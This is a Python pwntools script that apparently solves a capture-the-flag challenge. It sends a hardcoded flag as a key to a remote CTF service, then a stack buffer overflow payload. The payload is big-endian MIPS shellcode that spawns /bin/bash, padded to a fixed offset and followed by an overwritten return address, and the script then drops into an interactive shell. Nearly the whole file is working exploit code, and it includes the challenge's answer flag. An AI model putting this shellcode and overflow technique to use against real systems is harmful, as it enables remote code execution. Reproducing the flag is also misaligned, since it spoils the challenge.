from pwn import *

def pack(x):
	return p32(x, endian='big')

sc = "\x24\x06\x06\x66" 
sc += "\x04\xd0\xff\xff" 
sc += "\x28\x06\xff\xff" 
sc += "\x27\xbd\xff\xe0" 
sc += "\x27\xe4\x10\x01" 
sc += "\x24\x84\xf0\x1f" 
sc += "\xaf\xa4\xff\xe8" 
sc += "\xaf\xa0\xff\xec" 
sc += "\x27\xa5\xff\xe8" 
sc += "\x24\x02\x0f\xab" 
sc += "\x01\x01\x01\x0c" 
sc += "/bin/bash"

addr = 0x7fff6b04
for _ in range(1):
    print hex(addr)
    p = remote('9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site', 35000)

    p.recvuntil('key: ')
    p.sendline('EKO{LaBigBef0rd}')

    payload = sc.ljust(0x46 * 0x4, '\x00')
    payload += pack(addr)

    p.recvuntil('> ')
    p.sendline(payload)

    p.interactive()

'''
    p.sendline('id')

    try:
        print p.recvline()
        p.interactive()
    except:
        addr += 4
        p.close()
'''
